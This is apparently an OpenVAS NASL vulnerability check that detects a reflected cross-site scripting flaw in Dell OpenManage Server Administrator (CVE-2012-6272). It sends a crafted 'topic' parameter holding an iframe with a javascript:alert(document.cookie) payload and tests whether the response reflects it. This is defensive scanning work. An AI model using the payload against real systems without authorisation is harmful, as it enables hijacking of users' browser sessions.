##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_dell_omsa_mult_xss_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Dell OpenManage Server Administrator Multiple XSS Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary HTML
  and script code in a user's browser session in context of an affected site.
  Impact Level: Application";
tag_affected = "Dell OpenManage Server Administrator version 6.5.0.1, 7.0.0.1 and 7.1.0.1";


tag_insight = "Input passed via the 'topic' parameter to
   - /help/sm/es/Output/wwhelp/wwhimpl/js/html/index_main.htm,
   - /help/sm/ja/Output/wwhelp/wwhimpl/js/html/index_main.htm,
   - /help/sm/de/Output/wwhelp/wwhimpl/js/html/index_main.htm,
   - /help/sm/fr/Output/wwhelp/wwhimpl/js/html/index_main.htm,
   - /help/sm/zh/Output/wwhelp/wwhimpl/js/html/index_main.htm,
   - /help/hip/en/msgguide/wwhelp/wwhimpl/js/html/index_main.htm and
   - /help/hip/en/msgguide/wwhelp/wwhimpl/common/html/index_main.htm is not
  properly sanitized before being returned to the user.";
tag_solution = "No solution or patch is available as of 30th January, 2013. Information
  regarding this issue will be updated once the solution details are available.
  http://content.dell.com/us/en/enterprise/d/solutions/openmanage-server-administrator";
tag_summary = "This host is running Dell OpenManage Server Administrator and is
  prone to multiple cross site scripting vulnerabilities.";

if(description)
{
  script_id(902941);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2012-6272");
  script_bugtraq_id(57212);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-01-30 15:21:55 +0530 (Wed, 30 Jan 2013)");
  script_name("Dell OpenManage Server Administrator Multiple XSS Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/89071");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/51764");
  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/950172");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/81158");

  script_description(desc);
  script_summary("Check the XSS vulnerability in OpenManage Server Administrator");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 1311);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("openvas-https.inc");

## Variable Initialization
req = "";
res = "";
host = "";
url = "";
port = "";

## Get Port
port = get_http_port(default:1311);
if(!port){
  port = 1311;
}

## Check port state
if(!get_port_state(port)){
  exit(0);
}

## Get Host Name
host = get_host_name();
if(!host){
  exit(0);
}

## Construct https request
req = string("GET /servlet/OMSALogin?msgStatus=null HTTP/1.1\r\n",
             "Host: ", host, "\r\n\r\n");
res = https_req_get(port:port, request:req);

## Confirm the application before trying exploit
if(res && res =~ "HTTP/1.. 200 OK" && ">Dell OpenManage <" >< res)
{
  ## Construct the XSS attack request
  url = '/help/sm/en/Output/wwhelp/wwhimpl/js/html/index_main.htm?topic="><' +
        '/iframe><iframe src="javascript:alert(document.cookie)';

  req = string("GET ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n\r\n");
  res = https_req_get(port:port, request:req);

  ## Confirm exploit worked by checking the response
  if(res && res =~ "HTTP/1.. 200 OK" &&
     "javascript:alert(document.cookie)" >< res && "OMSS_Help" >< res){
    security_warning(port);
  }
}
